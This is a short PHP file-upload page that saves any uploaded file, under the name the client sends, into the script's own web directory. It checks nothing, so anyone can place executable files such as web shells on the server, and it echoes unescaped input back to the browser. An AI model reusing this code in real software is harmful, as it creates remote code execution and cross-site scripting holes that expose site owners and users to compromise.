<?php

ini_set("display_errors",true);
error_reporting(ALL);

if($_POST['submit'] != ''){

		$src = $_FILES[userfile][tmp_name];
		$tar = dirname(__FILE__)."/".$_FILES[userfile][name];

		echo "<font color=red><br><br>Copy $src to $tar <br><br><hr><br></font>";
		
		copy($src,$tar);
}

?>

<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method=post>
	send this file: <input name="userfile" type="file">
	<input type="submit" name="submit" value="send file">
</form>

